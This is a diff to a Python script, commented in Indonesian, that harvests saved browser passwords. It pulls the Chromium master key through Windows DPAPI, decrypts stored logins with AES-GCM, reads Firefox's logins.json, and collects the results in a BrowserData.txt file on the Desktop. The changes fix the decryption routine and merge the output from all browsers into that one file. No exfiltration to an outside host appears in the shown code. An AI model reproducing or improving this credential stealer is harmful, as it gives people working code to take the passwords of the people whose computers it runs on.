@@ -7,9 +7,8 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from win32crypt import CryptUnprotectData
 
 # Lokasi Desktop untuk menyimpan file hasil
-desktop = os.path.join(os.getenv("USERPROFILE"), "Desktop", "FetchedBrowserData")
-if not os.path.exists(desktop):
-    os.makedirs(desktop)
+desktop = os.path.join(os.getenv("USERPROFILE"), "Desktop")
+output_file = os.path.join(desktop, "BrowserData.txt")
 
 # Direktori Profil Firefox
 firefox_dir = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
@@ -51,19 +50,16 @@ def decrypt_password_chromium(buff: bytes, key: bytes) -> str:
     iv = buff[3:15]
     payload = buff[15:]
     cipher = Cipher(algorithms.AES(key), modes.GCM(iv))
-    decrypted_pass = cipher.decrypt(payload)
+    decryptor = cipher.decryptor()
+    decrypted_pass = decryptor.update(payload)
     return decrypted_pass[:-16].decode()
 
 
-def save_to_file(browser_name, file_name, content):
-    """Simpan Hasil ke File"""
-    save_dir = os.path.join(desktop, browser_name)
-    if not os.path.exists(save_dir):
-        os.makedirs(save_dir)
-    file_path = os.path.join(save_dir, file_name + '.txt')
-    with open(file_path, 'w', encoding='utf-8') as f:
+def save_to_file(content):
+    """Simpan Semua Hasil ke Satu File TXT"""
+    with open(output_file, 'a', encoding='utf-8') as f:
         f.write(content)
-    print(f"[✔] Hasil disimpan di {file_path}")
+    print(f"[✔] Data ditambahkan ke {output_file}")
 
 
 def get_data_chromium(path: str, profile: str, key, type_of_data):
@@ -117,7 +113,7 @@ def get_firefox_logins(profile, master_key):
     """Ambil Data Login dari Firefox"""
     logins_path = os.path.join(firefox_dir, profile, 'logins.json')
     if not os.path.exists(logins_path):
-        return "Logins file tidak ditemukan."
+        return "Logins file tidak ditemukan.\n"
 
     with open(logins_path, 'r') as f:
         logins = json.load(f)
@@ -134,13 +130,16 @@ def get_firefox_logins(profile, master_key):
 
 
 if __name__ == '__main__':
+    if os.path.exists(output_file):
+        os.remove(output_file)
+
     # Chromium Browsers
     for browser_name, browser_path in browsers.items():
         if os.path.exists(browser_path):
             print(f"[✔] Memproses {browser_name}...")
             master_key = get_master_key_chromium(browser_path)
             data = get_data_chromium(browser_path, 'Default', master_key, data_queries['login_data'])
-            save_to_file(browser_name, 'login_data', data)
+            save_to_file(f"\n--- {browser_name.capitalize()} ---\n{data}")
 
     # Firefox Browsers
     profiles = [p for p in os.listdir(firefox_dir) if p.endswith('.default-release')]
@@ -149,4 +148,4 @@ if __name__ == '__main__':
         master_key = get_firefox_master_key(profile)
         if master_key:
             data = get_firefox_logins(profile, master_key)
-            save_to_file("firefox", f"{profile}_login_data", data)
+            save_to_file(f"\n--- Firefox ({profile}) ---\n{data}")
